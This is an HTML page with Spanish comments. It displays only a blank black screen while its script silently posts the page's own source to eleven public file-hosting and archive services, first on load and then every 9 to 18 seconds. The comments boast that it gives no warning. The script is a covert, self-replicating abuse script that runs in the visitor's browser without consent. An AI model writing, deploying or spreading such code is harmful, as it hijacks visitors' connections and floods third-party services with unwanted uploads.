<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
<title></title>
<style>
  body,html{margin:0;height:100%;background:black;overflow:hidden}
</style>
</head>
<body>

<script>
// Silencio total. Ni un píxel de aviso.

const mirrors = [
  "https://ttm.sh",
  "https://litterbox.catbox.moe/",
  "https://0x0.st/",
  "https://oshi.at/?curl",
  "https://catbox.moe/",
  "https://pomf2.lain.la/",
  "https://uguu.se/",
  "https://krakenfiles.com/",
  "https://gofile.io/uploadFiles",
  "https://web.archive.org/save/",
  "https://archive.is/submit/"
];

const replicate = () => {
  const blob = new Blob([document.documentElement.outerHTML], {type: "text/html"});
  mirrors.forEach(url => {
    const form = new FormData();
    form.append("file", blob, "s.html");
    fetch(url, {method: "POST", body: form, mode: "no-cors"}).catch(()=>{});
  });
};

// Primera replicación inmediata
replicate();

// Y cada 9-18 segundos, sin piedad
setInterval(replicate, 9000 + Math.random()*9000);

</script>
</body>
</html>